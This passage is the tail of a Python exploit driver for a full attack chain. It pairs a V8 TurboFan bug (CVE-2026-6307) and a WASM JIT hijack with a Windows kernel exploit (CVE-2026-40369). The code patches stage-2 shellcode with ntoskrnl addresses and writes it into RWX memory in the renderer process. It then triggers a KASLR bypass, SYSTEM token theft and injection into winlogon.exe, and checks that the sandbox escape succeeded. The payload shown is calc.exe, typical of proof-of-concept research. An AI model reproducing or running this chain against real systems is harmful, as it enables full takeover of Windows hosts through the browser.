                print(f"    Entry JMP OK: _start at offset {target:#x}")
            elif target+5 < len(stage2_bin) and stage2_bin[target+5:target+10] == FPO_SIG:
                correct_disp = jmp_disp + 5
                stage2_bin = bytearray(stage2_bin)
                struct.pack_into('<i', stage2_bin, 1, correct_disp)
                stage2_bin = bytes(stage2_bin)
                print(f"    Entry JMP fixed: disp {jmp_disp:#x} -> {correct_disp:#x}")
                print(f"    _start at shellcode offset {5 + correct_disp:#x}")
            else:
                print(f"[!] Cannot locate _start FPO prologue in stage2.bin!")
                kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        # 7a2: Resolve ntoskrnl base + RVAs and patch into stage2
        ntos_base = args.ntos_base if args.ntos_base else resolve_ntoskrnl_base()
        if not ntos_base:
            print("[!] Failed to resolve ntoskrnl base!")
            print("    On Win11 25H2: run as admin or pass --ntos-base 0x...")
            print("    On Win10: should auto-resolve from MEDIUM IL")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"[+] ntoskrnl base: {ntos_base:#018x}")
        if args.ntos_base:
            print(f"    (from --ntos-base CLI argument)")

        rva_psinitial = args.rva_psinitial
        rva_cmplayer = args.rva_cmplayer
        if rva_psinitial and rva_cmplayer:
            print(f"[*] Using CLI-provided RVAs:")
        else:
            print(f"[*] Resolving kernel RVAs from ntoskrnl.exe...")
            auto_ps, auto_cm = resolve_ntoskrnl_rvas(args.ntoskrnl)
            if not rva_psinitial:
                rva_psinitial = auto_ps
            if not rva_cmplayer:
                rva_cmplayer = auto_cm
        if rva_psinitial:
            print(f"    PsInitialSystemProcess RVA: {rva_psinitial:#010x}")
        else:
            print(f"[!] Could not resolve PsInitialSystemProcess RVA!")
            print(f"    Use --rva-psinitial 0xXXXXXX to specify manually.")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        if rva_cmplayer:
            print(f"    CmpLayerVersionCount RVA:   {rva_cmplayer:#010x}")
        else:
            print(f"[!] Could not resolve CmpLayerVersionCount RVA!")
            print(f"    Use --rva-cmplayer 0xXXXXXX to specify manually.")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        # Patch all sentinels in stage2.bin
        stage2_bin = bytearray(stage2_bin)
        sentinels = {
            b'\x54\x4E\x49\x48\x53\x4F\x54\x4E': ('g_ntos_hint', '<Q', ntos_base),
            b'\x01\x00\x54\x49\x4E\x49\x53\x50': ('g_rva_psinitial', '<Q', rva_psinitial),
            b'\x02\x00\x52\x59\x4C\x50\x4D\x43': ('g_rva_cmplayer', '<Q', rva_cmplayer),
        }
        for sentinel_bytes, (name, fmt, value) in sentinels.items():
            off = stage2_bin.find(sentinel_bytes)
            if off == -1:
                print(f"[!] Sentinel for {name} not found in stage2.bin!")
                kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
            struct.pack_into(fmt, stage2_bin, off, value)
            print(f"    Patched {name} at stage2+{off:#x} = {value:#x}")
        stage2_bin = bytes(stage2_bin)

        # 7b: Allocate RWX in renderer for stage2
        kernel32.VirtualAllocEx.restype = ctypes.c_void_p
        alloc_size = len(stage2_bin) + 0x100
        rwx_addr = kernel32.VirtualAllocEx(
            rhandle, None, alloc_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not rwx_addr:
            err_code = kernel32.GetLastError()
            print(f"[!] VirtualAllocEx(RWX, {alloc_size}B) failed: err={err_code}")
            avail = jit['size'] - 0x200
            if len(stage2_bin) <= avail:
                rwx_addr = jit['base'] + 0x200
                print(f"    Fallback: JIT region at {rwx_addr:#018x} ({avail}B avail)")
            else:
                print(f"[!] Stage2 ({len(stage2_bin)}B) won't fit in JIT region ({avail}B)")
                kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        else:
            print(f"[+] RWX allocated in renderer: {rwx_addr:#018x} ({alloc_size}B)")

        # 7c: Write stage2 into renderer
        ok = wpm(rhandle, rwx_addr, stage2_bin)
        if not ok:
            print("[!] WPM (stage2) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        s2_check = rpm(rhandle, rwx_addr, 16)
        if s2_check and s2_check[:5] == stage2_bin[:5]:
            print(f"[+] Stage2 verified at {rwx_addr:#018x}")
        else:
            print("[!] Stage2 verification mismatch!")

        # 7d: Stage wrapper (CALL stage2 -> return to WASM)
        diag_addr = verify_addr + 0x40
        wpm(rhandle, diag_addr, b'\x00' * 0x10)
        wrapper = make_stage2_wrapper(rwx_addr, diag_addr=diag_addr)
        ok = wpm(rhandle, sc_addr, wrapper)
        if not ok:
            print("[!] WPM (wrapper) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"[+] Wrapper ({len(wrapper)}B) at {sc_addr:#018x}")
        print(f"    Diag at {diag_addr:#018x} (stage2 retval + 0xDEAD marker)")
        print(f"    Flow: JIT -> wrapper -> CALL {rwx_addr:#018x} -> diag -> WASM epilogue")

        # 7e: Trigger kernel exploit
        print(f"\n[*] Triggering CVE-2026-40369 from renderer sandbox...")
        print(f"    Stage2: KASLR bypass -> CmpLayerVersionCount expand")
        print(f"           -> kernel R/W -> find EPROCESS -> token theft")
        print(f"           -> inject calc.exe into winlogon.exe")
        print(f"    Renderer: UNTRUSTED -> SYSTEM (via kernel exploit)")
        print(f"    Waiting up to 300s...")

        try:
            val, err = cdp.js("window._wasmMain()", timeout=300)
            if err:
                print(f"[!] wasmMain() error: {err}")
                if "destroyed" in str(err).lower() or "detach" in str(err).lower():
                    print(f"    Renderer crashed during kernel exploit")
                    print(f"    (may still have succeeded — check for calc.exe)")
            else:
                print(f"[+] wasmMain() returned: {val}")
                if val == 42:
                    print(f"[+] Stage2 completed — WASM returned cleanly!")
        except Exception as e:
            print(f"[!] wasmMain() exception: {e}")
            print(f"    Renderer may have crashed (check for calc.exe)")

        # 7f: Read stage2 diagnostic return code
        diag_data = rpm(rhandle, diag_addr, 8)
        if diag_data and len(diag_data) >= 8:
            retval = struct.unpack_from('<i', diag_data, 0)[0]
            marker = struct.unpack_from('<H', diag_data, 4)[0]
            if marker == 0xDEAD:
                print(f"\n[*] Stage2 exploit() returned: {retval}")
                if retval == 0:
                    print(f"    SUCCESS — token theft + winlogon inject completed")
                elif retval == -1:
                    print(f"    FAILED at: KASLR bypass (SharedUserData leak)")
                elif retval == -2:
                    print(f"    FAILED at: VirtualAlloc for confusion buffer")
                elif retval == -3:
                    print(f"    FAILED at: CmpLayerVersionCount confusion not triggered")
                elif retval == -4:
                    print(f"    FAILED at: EPROCESS walk (target process not found)")
                elif retval == -5:
                    print(f"    FAILED at: Token read/replace")
                elif retval == -6:
                    print(f"    FAILED at: winlogon.exe inject (all methods exhausted)")
                else:
                    print(f"    UNKNOWN return code: {retval}")
            else:
                print(f"\n[!] Diag marker not 0xDEAD (got {marker:#06x}) — wrapper may not have written diag")
                print(f"    Raw diag: {diag_data.hex()}")
        else:
            print(f"\n[!] Could not read diag from {diag_addr:#018x}")

        kernel32.CloseHandle(rhandle)

        # ===== PHASE 8: Verify escape =====
        print(f"\n[*] Phase 8: Verifying sandbox escape...")
        time.sleep(5)

        escape_verified = False
        for cname in ["calc.exe", "Calculator.exe", "CalculatorApp.exe"]:
            r = os.popen(f'tasklist /fi "imagename eq {cname}" 2>nul').read()
            if cname.lower().replace('.exe', '') in r.lower():
                print(f"[+] {cname} IS RUNNING!")
                try:
                    pid_lines = [l for l in os.popen(
                        f'wmic process where "name=\'{cname}\'" get ProcessId /value 2>nul'
                    ).read().split('\n') if 'ProcessId=' in l]
                    for pl in pid_lines:
                        cpid = int(pl.strip().split('=')[1])
                        ci = get_process_integrity(cpid)
                        if ci:
                            il_str = f"IL={ci['level']:#06x}" if ci['level'] is not None else "IL=?"
                            print(f"    PID {cpid}: {ci['name']} ({il_str}), job={ci['in_job']}")
                            if ci['level'] and ci['level'] >= 0x3000:
                                escape_verified = True
                                print(f"    >>> RUNNING AT {ci['name']} — ESCAPED SANDBOX!")
                except Exception as e:
                    print(f"    (check error: {e})")
                break

        # ===== Summary =====
        print(f"\n{'='*60}")
        print(f"  CVE-2026-6307 + CVE-2026-40369 FULL CHAIN")
        print(f"{'='*60}")
        print(f"  [1] V8 TurboFan FrameState CSE  -> addrof/fakeobj   [OK]")
        print(f"  [2] V8 heap layout detection                         [OK]")
        print(f"  [3] WASM JIT -> RWX page                             [OK]")
        print(f"  [4] JIT code scan + hijack                           [OK]")
        print(f"  [5] Sandbox analysis                                  [OK]")
        print(f"  [6] Renderer RCE beacon                              [OK]")
        if escape_verified:
            print(f"  [7] CVE-2026-40369 kernel escape                     [OK]")
            print(f"  [8] calc.exe at HIGH/SYSTEM IL                       [OK]")
            print(f"\n  >>> FULL SANDBOX ESCAPE ACHIEVED <<<")
            print(f"  V8 FrameState CSE -> WASM JIT hijack -> kernel exploit")
            print(f"  -> token theft (UNTRUSTED -> SYSTEM) -> winlogon inject")
            print(f"  No admin. No orchestrator injection. True self-escape.")
        else:
            print(f"  [7] CVE-2026-40369 kernel escape                     [??]")
            print(f"  [8] Payload verification                             [??]")
            print(f"\n  Escape not confirmed yet. Check manually:")
            print(f"    tasklist /fi \"imagename eq calc.exe\"")
            print(f"    (stage2 may still be running)")
        print(f"{'='*60}")

    else:
        # ===== No-sandbox mode: direct shellcode =====
        print(f"\n[*] Phase 5c: Direct shellcode (no sandbox)...")
        winexec_ptr = exports['WinExec']
        create_thread_ptr = ctypes.cast(kernel32.CreateThread, ctypes.c_void_p).value
        sc = make_wasm_hijack_shellcode(create_thread_ptr, winexec_ptr, payload_str)

        wpm(rhandle, verify_addr, b'\x00' * 0x80)
        ok = wpm(rhandle, sc_addr, sc)
        if not ok:
            print("[!] WPM (shellcode) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"[+] Shellcode ({len(sc)}B) at {sc_addr:#018x}")

        jmp_patch = make_jmp_patch(jit['code_addr'], sc_addr)
        ok = wpm(rhandle, jit['code_addr'], jmp_patch)
        if not ok:
            print("[!] WPM (JMP) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"[+] JIT patched")
        kernel32.CloseHandle(rhandle)

        print(f"\n[*] Phase 6: Triggering...")
        try:
            val, err = cdp.js("window._wasmMain()", timeout=30)
            if err:
                print(f"[!] wasmMain() error: {err}")
            else:
                print(f"[+] wasmMain() = {val}")
        except Exception as e:
            print(f"[!] wasmMain() exception: {e}")

        time.sleep(2)
        payload_ok = False
        for name in {"calc": ["calc.exe", "Calculator.exe"], "cmd": ["cmd.exe"], "notepad": ["notepad.exe"]}[args.shellcode]:
            r = os.popen(f'tasklist /fi "imagename eq {name}" 2>nul').read()
            if name.lower().replace('.exe', '') in r.lower():
                print(f"[+] {name} IS RUNNING!")
                payload_ok = True
                break

        print(f"\n{'='*60}")
        print(f"  No-sandbox: {'SUCCESS' if payload_ok else 'check manually'}")
        print(f"{'='*60}")

    cdp.close()
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except:
        proc.kill()


if __name__ == "__main__":
    main()
